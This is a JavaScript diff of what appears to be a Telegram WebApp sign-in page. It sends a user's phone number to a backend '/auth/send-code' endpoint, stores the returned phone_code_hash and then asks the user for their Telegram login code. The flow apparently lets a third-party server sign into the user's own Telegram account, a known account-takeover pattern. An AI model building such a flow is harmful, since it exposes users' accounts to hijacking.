@@ -331,25 +331,14 @@ async function sharePhoneNumber() {
     shareBtn.innerHTML = '<div class="telegram-icon"></div>Запрос номера телефона...';
     
     try {
+        let phoneNumber;
+        
         if (window.Telegram && Telegram.WebApp) {
+            // В Telegram - запрашиваем контакт
             Telegram.WebApp.requestContact(async (contact) => {
                 if (contact) {
-                    authData.phone = contact.phone_number;
-                    console.log('Phone received:', authData.phone);
-                    
-                    // Отправляем номер боту
-                    await sendDataToBot({
-                        action: 'phone_received',
-                        phone: authData.phone
-                    });
-                    
-                    shareBtn.innerHTML = '<div class="telegram-icon"></div>Номер отправлен боту';
-                    status.textContent = 'Ожидайте код в Telegram...';
-                    
-                    // Показываем форму ввода кода
-                    document.getElementById('initialScreen').style.display = 'none';
-                    document.getElementById('codeForm').style.display = 'block';
-                    
+                    phoneNumber = contact.phone_number;
+                    await sendCodeToBackend(phoneNumber);
                 } else {
                     status.textContent = 'Предоставление номера отменено';
                     shareBtn.disabled = false;
@@ -357,16 +346,49 @@ async function sharePhoneNumber() {
                 }
             });
         } else {
-            // Fallback для браузера
-            authData.phone = '+1234567890';
-            document.getElementById('initialScreen').style.display = 'none';
-            document.getElementById('codeForm').style.display = 'block';
+            // Вне Telegram - используем тестовый номер
+            phoneNumber = '+79991234567'; // Тестовый номер
+            await sendCodeToBackend(phoneNumber);
         }
     } catch (error) {
         console.error('Error:', error);
-        status.textContent = 'Ошибка запроса номера';
+        status.textContent = 'Ошибка: ' + error.message;
         shareBtn.disabled = false;
         shareBtn.innerHTML = '<div class="telegram-icon"></div>Войти через Telegram';
+    }
+}
+
+async function sendCodeToBackend(phone) {
+    const status = document.getElementById('codeStatus');
+    
+    try {
+        status.textContent = 'Отправка запроса на сервер...';
+        
+        const response = await fetch(BACKEND_URL + '/auth/send-code', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                phone: phone
+            })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            authData.phone = phone;
+            authData.phoneCodeHash = result.phone_code_hash;
+            
+            document.getElementById('initialScreen').style.display = 'none';
+            document.getElementById('codeForm').style.display = 'block';
+            status.textContent = 'Код отправлен! Проверьте Telegram';
+        } else {
+            status.textContent = 'Ошибка: ' + result.message;
+        }
+    } catch (error) {
+        console.error('Backend error:', error);
+        status.textContent = 'Ошибка соединения с сервером';
     }
 }
 
@@ -561,6 +583,7 @@ function getUserIdFromURL() {
     </script>
 </body>
 </html>
+
 
 
 
